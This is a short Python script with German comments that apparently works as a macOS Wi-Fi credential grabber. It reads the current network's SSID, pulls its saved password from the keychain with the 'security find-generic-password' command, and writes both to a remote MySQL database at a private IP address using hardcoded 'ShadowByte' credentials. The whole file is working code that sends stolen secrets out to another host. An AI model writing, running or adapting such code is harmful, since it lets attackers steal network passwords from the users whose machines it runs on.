import subprocess
import re
import mysql.connector

# MySQL-Datenbankverbindung herstellen
connection = mysql.connector.connect(
    host="192.168.1.71",
    user="ShadowByte",
    password="ShadowByte",
    database="system_info_db"
)

# Funktion, um die SSID und Passwörter der gespeicherten WLAN-Netzwerke zu erhalten
def get_wifi_info():
    # Kommando zum Abrufen aller gespeicherten WLAN-Profile (für macOS)
    command = ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "--getinfo"]
    try:
        result = subprocess.run(command, capture_output=True, text=True).stdout
        print(f"Ergebnisse von 'airport --getinfo':\n{result}")
    except Exception as e:
        print(f"Fehler beim Ausführen des Befehls: {e}")
        return []

    # SSID extrahieren
    ssid_match = re.search(r"^\s*SSID:\s*(.*)", result, re.MULTILINE)
    ssid = ssid_match.group(1) if ssid_match else None

    wifi_data = []
    
    if ssid:
        # Kommando zum Abrufen des WLAN-Passworts (erfordert `security`-Befehl und Sudo-Zugriff)
        command = ["security", "find-generic-password", "-wa", ssid]
        try:
            password = subprocess.run(command, capture_output=True, text=True).stdout.strip()
            print(f"Passwort für '{ssid}' gefunden: {password}")
        except Exception as e:
            print(f"Fehler beim Abrufen des Passworts für {ssid}: {e}")
            password = None

        wifi_data.append((ssid, password))
    
    return wifi_data

# Funktion zum Speichern der WLAN-Informationen in der Datenbank
def store_wifi_info(wifi_data):
    cursor = connection.cursor()

    # SQL-Anweisung zum Einfügen der WLAN-Daten
    query = "INSERT INTO wifi_info (ssid, password) VALUES (%s, %s)"
    
    # WLAN-Daten in die Datenbank einfügen
    for ssid, password in wifi_data:
        try:
            print(f"Einfügen: SSID = {ssid}, Passwort = {password}")
            cursor.execute(query, (ssid, password))
        except mysql.connector.Error as err:
            print(f"Fehler beim Einfügen in die Datenbank: {err}")
    
    # Änderungen speichern
    connection.commit()
    cursor.close()

# WLAN-Daten abrufen
wifi_info = get_wifi_info()

if wifi_info:
    # WLAN-Daten in die Datenbank speichern
    store_wifi_info(wifi_info)
    print("WLAN-Daten erfolgreich an die Datenbank gesendet.")
else:
    print("Keine WLAN-Daten gefunden.")

# Datenbankverbindung schließen
connection.close()
